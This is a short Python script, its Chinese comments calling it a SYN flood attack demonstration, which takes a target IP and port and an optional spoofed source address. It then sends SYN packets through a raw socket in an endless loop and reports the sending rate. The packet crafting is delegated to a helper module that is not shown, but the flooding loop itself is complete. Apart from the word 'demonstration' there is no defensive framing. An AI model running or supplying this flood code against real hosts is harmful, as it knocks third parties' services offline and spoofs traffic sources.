# ---------------------
# SYN Flood 攻击演示程序
# 需要有root权限或设置了
# CAP_NET_RAW权限位
# ---------------------

import socket
import time

import synutil

source_ip = input('Source IP (leave blank if you want to randomize):')
destination_ip = input('Dest. IP:')
destination_port = int(input('Dest. port:'))

if __name__ == '__main__':
    counter = 0
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
        try:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            last_time = time.time()
            while True:
                synutil.send_syn(s, source_ip, destination_ip, destination_port)
                counter += 1
                if not counter & 65535:
                    t = time.time() - last_time
                    last_time = time.time()
                    print(f'SYN packets sent: {counter}. Speed: %.2fk pkt/s.' % (65536 / t / 1000))
        except KeyboardInterrupt:
            print(f'Totally sent {counter} SYN packets.')
